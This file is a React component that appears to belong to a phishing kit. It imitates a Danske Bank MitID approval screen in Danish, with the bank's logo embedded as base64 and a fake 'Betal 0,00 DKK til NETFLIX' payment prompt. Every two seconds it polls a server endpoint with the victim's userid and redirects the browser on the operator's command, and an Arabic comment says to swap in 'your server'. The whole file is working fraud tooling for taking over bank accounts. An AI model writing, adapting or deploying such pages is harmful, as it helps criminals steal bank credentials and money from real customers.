import { useEffect } from "react";
import "./Authentication.css";
import emulator from "./code-app-slider-emulator.svg";


export default function Authentication() {
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const userid = params.get("userid");

    const interval = setInterval(async () => {
      try {
        // 🔴 API وهمي – بدّلو بسيرفرك أنت
        const res = await fetch(
          `/check_redirect?userid=${userid}&t=${Date.now()}`
        );
        const data = await res.json();

        if (data.redirect) {
          clearInterval(interval);
          window.location.href = data.redirect;
        }
      } catch (err) {
        console.error("Polling error", err);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="page">
      <section className="wrapper">
        <header className="header">
          <div className="imgcon">
            <img style={{width:100,marginTop:14}} src="data:image/svg+xml;base64,PHN2ZyBpZD0iRGFuc2tlX0JhbmtfQl9DX1dCIiBkYXRhLW5hbWU9IkRhbnNrZSBCYW5rIEJfQ19XQiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNjY2LjQxIDEwMC41NSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMwMDM3NTU7fS5jbHMtMntmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5EYW5za2UgQmFuayBCIFJHQiBXQjwvdGl0bGU+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNTIyLjEzLDE1MS42NFYyNTIuMkg3NjAuNzJWMTUxLjY0Wm0yMzYsMi41OHY5NS40SDUyNC43MXYtOTUuNFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05NC4zMSAtMTUxLjY0KSIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTk0LjMxLDE1MS42NFYyNTIuMkg1MTEuODRWMTUxLjY0WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTk0LjMxIC0xNTEuNjQpIi8+PHBhdGggY2xhc3M9ImNscy0yIiBkPSJNNzU4LjE0LDE1NC4yMnY5NS40SDUyNC43MXYtOTUuNFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05NC4zMSAtMTUxLjY0KSIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTIzOC40OSwyMDguNzNjMCw5Ljg2LTUuMjYsMTQuNzYtMTcuMTQsMTQuNzZIMjAyLjYydi0zN0gyMjAuN2MxNC40LDAsMTcuNzksNywxNy43OSwxNC42MVptNy43LS4yOVYyMDIuMWMwLTIwLjIzLTE1LjkyLTIxLTI2LjY1LTIxSDE5NC45MlYyMjlIMjIxLjdDMjQyLjczLDIyOSwyNDYuMTksMjE3LjU5LDI0Ni4xOSwyMDguNDRaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtOTQuMzEgLTE1MS42NCkiLz48cGF0aCBjbGFzcz0iY2xzLTIiIGQ9Ik0yODcuODksMjE3LjE1YzAsMi44MS0uMjIsNS4zMy0zLjM5LDYuNDktMS44Ny43MS00LjU0LjkzLTksLjkzcy03LjEzLS40My04LjcyLTEuNDRjLTEuMDctLjY1LTEuNTEtMS43My0xLjUxLTQsMC0yLjg4LjcyLTQuNTQsMi4xNi01LjE5czMuMS0uNzksOC41Ny0uNzloMTEuODlaTTI5NS4xNiwyMjlWMjEwLjE3YTU2LjY2LDU2LjY2LDAsMCwwLS4yOS03Ljg1LDYuMzgsNi4zOCwwLDAsMC0yLjUyLTQuMzJjLTMuNDYtMi43NC0xMi0yLjgxLTE2LjI4LTIuODEtMy4xNiwwLTExLjg4LjM2LTE1LjA1LDMuMWE0LDQsMCwwLDAtMS4zNiwzLjMxYzAsLjg2LjE0LDIsLjIxLDMuNTNoNy4wNmMuMTQtLjg3LjI5LTIuOTUsMS4wOC0zLjc1czIuNTktMS4yOSw3LjQxLTEuMjljNS41NSwwLDkuNDQuMjEsMTEsMS4wN3MxLjQ1LDIuNjcsMS40NSw0djMuMzFIMjcxLjYxYy00LjM5LDAtOS40NC4wOC0xMi4yNCwzLjg5YTEwLjQ2LDEwLjQ2LDAsMCwwLTEuOCw2LjQ4YzAsNy45Miw0Ljg5LDEwLjU5LDE3LjQzLDEwLjU5LDYuNTUsMCwxMC44LTEsMTMuMzktMy4yNEwyODksMjI5WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTk0LjMxIC0xNTEuNjQpIi8+PHBhdGggY2xhc3M9ImNscy0yIiBkPSJNMzM4LjgsMjI5VjIxMC42N2MwLTYuMzMtLjI5LTcuNy0xLjgtOC44NnMtNC4zMi0xLjcyLTguNzItMS43MmE0NC44NSw0NC44NSwwLDAsMC0xMS41OSwxLjUxVjIyOWgtNy4yVjE5NS40OEgzMTZsLjUsMi4zN2ExOC41NywxOC41NywwLDAsMSw0LTEuOCwzMi44OCwzMi44OCwwLDAsMSw5LjQzLTEuMDgsMjYuMzMsMjYuMzMsMCwwLDEsMTAuODcsMS45NSw4LDgsMCwwLDEsNC42OSw1LjgzLDMxLjQ5LDMxLjQ5LDAsMCwxLC41LDcuMDZWMjI5WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTk0LjMxIC0xNTEuNjQpIi8+PHBhdGggY2xhc3M9ImNscy0yIiBkPSJNMzkyLjA5LDIyN2MtMy4zMSwxLjY1LTguNzEsMi4zNy0xNS43NywyLjM3YTUxLjQ3LDUxLjQ3LDAsMCwxLTEyLjEtMS4xNWMtMy4zOS0uNzktNS0yLjM3LTUuMjYtNS4yNWEyNi41NiwyNi41NiwwLDAsMSwuMjItNC42OWg2LjkxYy4yMiwxLjczLjIyLDIuMjQuMjksMi42LjI5LDEuNTguMTQsMi40NSwyLDNhMzAuNTQsMzAuNTQsMCwwLDAsOC4zNi43OWM0LjYxLDAsNy43Ny0uNSw5Ljk0LTEuNDQsMS41MS0uNjQsMi4yMy0xLjg3LDIuMjMtNC4xNywwLTIuNjctLjU4LTMuNzUtMy4zMS00LjE4LS44Ny0uMTQtMS43My0uMTQtMi41OS0uMjItLjUxLS4wNy0yLjA5LS4wNy00LjYxLS4xNC0xLjIzLDAtMi42LS4wNy00LjI1LS4xNC03LjEzLS4zNi0xNC43Ny0uNjUtMTQuNzctOS4wOCwwLTcuNTYsNC42OC0xMC4yMywxNy40My0xMC4yM2E5Mi40Myw5Mi40MywwLDAsMSw5LjY1LjUxLDE3LjU2LDE3LjU2LDAsMCwxLDYuNDEsMS43M2MxLjY2LjkzLDIuMjMsMi40NSwyLjIzLDUuMTFBMTksMTksMCwwLDEsMzk1LDIwNWgtN2wtLjI4LTEuNTFjLS4zNy0xLjgtLjUxLTIuMTYtMS4wOS0yLjU5LTEtLjc5LTQuMS0xLjE1LTguNDItMS4xNXMtNi44NC4yMS04Ljg2LjkzYy0xLjg3LjY1LTIuNjYsMS44Ny0yLjY2LDQuMjVBNCw0LDAsMCwwLDM2OCwyMDguM2MxLjg4LDEuMTUsMTEuNzQsMSwxNS4xMywxLjA4YTI1Ljc3LDI1Ljc3LDAsMCwxLDguMDYsMS4wOGMzLjY4LDEuMjksNS4xMiwzLjY3LDUuMTIsOC41N0MzOTYuMzQsMjIzLDM5NSwyMjUuNDQsMzkyLjA5LDIyN1oiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05NC4zMSAtMTUxLjY0KSIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTQzNi4zNywyMjlsLTE3LjI4LTE1Ljg0SDQxNi41VjIyOWgtNy4yVjE4MS4wN2g3LjJ2MjcuM2gyLjU5bDE0LjMzLTEyLjg5aDguNDNsLTE2LjcxLDE0Ljc2TDQ0NiwyMjlaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtOTQuMzEgLTE1MS42NCkiLz48cGF0aCBjbGFzcz0iY2xzLTIiIGQ9Ik00ODEuNjcsMjA4Ljk0SDQ1OC41NmMuMjgtNC4xNywxLjE1LTYuMDUsMi44LTcuMjdzNC43Ni0xLjgsOS4yOS0xLjhjNi4yNywwLDkuMjIsMS4zNywxMC4zLDQuMjVBMTIuNzksMTIuNzksMCwwLDEsNDgxLjY3LDIwOC45NFptNi42Myw5LjU4aC03LjEzYy0uMjIsMS0uMzYsMy42LTEuMyw0LjU0cy0zLjI0LDEuNTgtOS4wNywxLjU4LTguODYtLjc5LTEwLjQ0LTIuMzdjLTEuMjMtMS4yMy0xLjk1LTMuNzUtMS45NS03Ljcxdi0uODZoMzAuMWMuMDgtMS42Ni4xNS0yLjA5LjE1LTMuMzksMC01LjU0LS43OS04LjY0LTMuMTctMTEtMi43NC0yLjgtOC00LjE3LTE1LjItNC4xNy05LjIxLDAtMTQuOSwyLjA5LTE3LjI4LDYuNjktMS4zNywyLjY3LTIuMTYsNi40MS0yLjE2LDExLjA5LDAsNy4yOCwxLjk0LDExLjg5LDYuMTksMTQuMTksMi42NywxLjQ0LDcuMjgsMi4yMywxMy4xMSwyLjMxYTQzLDQzLDAsMCwwLDEzLjExLTEuNTJjNC4xNy0xLjI5LDUuMTgtMy42Nyw1LjE4LTUuNjFDNDg4LjQ0LDIyMS43Niw0ODguNDQsMjIwLjExLDQ4OC4zLDIxOC41MloiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05NC4zMSAtMTUxLjY0KSIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTU4My4zNiwxOTMuMTdjMCw3LjA2LTQsOC41LTEyLjE3LDguNUg1NTNWMTg2LjQ4aDE5LjA5QzU3OS40LDE4Ni40OCw1ODMuMzYsMTg3LjEyLDU4My4zNiwxOTMuMTdabTkuNTEsMjIuMzNjMC01LjkxLTMuMzktMTAuMy0xMS40NS0xMS41M3YtLjE0YzYuMjYtMS42NSw5LjY1LTQuOSw5LjY1LTEwLDAtOC40My00LjExLTEyLjc1LTE1Ljc4LTEyLjc1SDU0NS4zNFYyMjloMzEuMThDNTg3LDIyOSw1OTIuODcsMjI0LjIxLDU5Mi44NywyMTUuNVptLTcuNzEuNWMwLDYuODQtNC44Miw3LjQ5LTEyLjMxLDcuNDlINTUzVjIwNy4wN2gyMC43NEM1ODIuNjQsMjA3LjA3LDU4NS4xNiwyMTAsNTg1LjE2LDIxNloiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05NC4zMSAtMTUxLjY0KSIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTYzMiwyMTcuMTVjMCwyLjgxLS4yMiw1LjMzLTMuMzksNi40OS0xLjg3LjcxLTQuNTMuOTMtOSwuOTNzLTcuMTMtLjQzLTguNzEtMS40NGMtMS4wOC0uNjUtMS41MS0xLjczLTEuNTEtNCwwLTIuODguNzItNC41NCwyLjE2LTUuMTlzMy4wOS0uNzksOC41Ny0uNzlINjMyWk02MzkuMzEsMjI5VjIxMC4xN2E1OC42Nyw1OC42NywwLDAsMC0uMjgtNy44NSw2LjM4LDYuMzgsMCwwLDAtMi41Mi00LjMyYy0zLjQ2LTIuNzQtMTItMi44MS0xNi4yOC0yLjgxLTMuMTcsMC0xMS44OC4zNi0xNS4wNSwzLjFhNCw0LDAsMCwwLTEuMzcsMy4zMWMwLC44Ni4xNSwyLC4yMiwzLjUzaDcuMDZjLjE0LS44Ny4yOC0yLjk1LDEuMDctMy43NS45NC0uOTQsMi42LTEuMjksNy40Mi0xLjI5LDUuNTUsMCw5LjQ0LjIxLDExLDEuMDdzMS40NCwyLjY3LDEuNDQsNHYzLjMxSDYxNS43N2MtNC40LDAtOS40NC4wOC0xMi4yNSwzLjg5YTEwLjUzLDEwLjUzLDAsMCwwLTEuOCw2LjQ4YzAsNy45Miw0LjksMTAuNTksMTcuNDMsMTAuNTksNi41NSwwLDEwLjgxLTEsMTMuMzktMy4yNGwuNjUsMi43M1oiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05NC4zMSAtMTUxLjY0KSIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTY4MS4xNiwyMjlWMjEwLjY3YzAtNi4zMy0uMjktNy43LTEuODEtOC44NnMtNC4zMi0xLjcyLTguNzEtMS43MkE0NC45Myw0NC45MywwLDAsMCw2NTksMjAxLjZWMjI5aC03LjJWMTk1LjQ4aDYuNDhsLjUxLDIuMzdhMTguNzIsMTguNzIsMCwwLDEsNC0xLjhBMzMsMzMsMCwwLDEsNjcyLjMsMTk1YTI2LjM5LDI2LjM5LDAsMCwxLDEwLjg3LDEuOTUsOCw4LDAsMCwxLDQuNjgsNS44MywzMS4zMiwzMS4zMiwwLDAsMSwuNTEsNy4wNlYyMjlaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtOTQuMzEgLTE1MS42NCkiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik03MjgsMjI5bC0xNy4yOC0xNS44NGgtMi41OVYyMjloLTcuMjFWMTgxLjA3aDcuMjF2MjcuM2gyLjU5TDcyNSwxOTUuNDhoOC40M2wtMTYuNzEsMTQuNzZMNzM3LjU0LDIyOVoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05NC4zMSAtMTUxLjY0KSIvPjwvc3ZnPg==" alt="Network" className="" />
          </div>
          <div style={{display:'flex',justifyContent:'center',alignItems:'center'}} className="imgcon lang">
            <img style={{width:33}} src="en.svg" alt="EN" />
          </div>
          <div  className="imgcon">
            <img style={{width:100}} src="1.svg" alt="Bank" className="" />
          </div>
        </header>

        <section className="container">
          <div className="mitidContextStr">
            Betal 0,00 DKK til NETFLIX - Tickets LIVE
          </div>

          <p className="title">
            Åbn MitID app og godkend
          </p>

          <div className="imageContainer">
             <object
        type="image/svg+xml"
        id="code-app-emulator"
        className="code-app-emulator"
        data={emulator}
      >
        <img
          alt="code-app-emulator"
          className="code-app-emulator"
          src={emulator}
        />
      </object>
          </div>
        </section>
      </section>
    </div>
  );
}
